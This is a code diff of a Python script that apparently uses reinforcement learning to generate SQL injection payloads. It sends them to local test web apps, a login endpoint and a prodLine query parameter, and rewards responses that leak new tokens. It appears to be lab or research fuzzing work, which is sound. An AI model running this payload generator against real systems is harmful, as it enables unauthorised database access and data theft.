@@ -17,9 +17,10 @@ url = 'http://localhost.proxyman.io:3000/rest/user/login'
 # https://stackoverflow.com/questions/9265172/scrape-an-entire-website
 # os.system('wget -m -k -K -E -l 7 -t 6 -w 5 http://localhost:3000 -P ./scraped')
 
-feature_count = 50
+feature_count = 150
 
 visible_chars = [chr(i) for i in range(32, 127)]
+numbers = [str(i) for i in range(0, 10)]
 
 with open('parsed-scrape.txt', 'r') as f:
     data = f.read()
@@ -55,10 +56,7 @@ columns = list(map(lambda column: column + ' ', data.split('\n')))
 
 tables_and_columns = tables + columns
 
-visible_chars *= max(3, int(len(tables_and_columns)/len(visible_chars))*4)
-sql_list *= max(3, int(len(tables_and_columns)/len(sql_list))*4)
-
-mutation_actions = sql_list + visible_chars + tables_and_columns
+mutation_actions = sql_list + numbers + tables_and_columns
 
 # Half of action space terminates to prefer smaller queries, which implies
 # more payloads executed.
@@ -77,6 +75,7 @@ injected_payloads = []
 terminated = False
 state: np.ndarray
 
+'''
 def __post_login_error():
     res = requests.post(url, data={
         'email': 'test'
@@ -89,11 +88,12 @@ def __post_login_error():
 
 # Ensure normal login error is not rewarded.
 __post_login_error()
+'''
 
 def __get_payload(state: np.ndarray):
     chrs = state.tolist()
     chrs = [chr(int(i)) for i in chrs if i != 0.0]
-    return '\' ' + ''.join(chrs) + '--'
+    return '\' ' + ''.join(chrs) + '#'
 
 # def __get_inverse_mutation_mask(with_replacements: bool = True):
 #    return range(len(replacement_actions), len(actions)) \
@@ -117,9 +117,10 @@ def __perform_termination_action():
         return state, -1, True
 
     print(payload)
-    res = requests.post(url, data={
-        'email': payload
-    })
+    res = requests.get(f'http://127.0.0.1:5000/pages?prodLine={payload}')
+    #res = requests.post(url, data={
+    #    'email': payload
+    #})
 
     unique_tokens = set()
     for token in re.split('[^a-zA-Z]+', res.text):
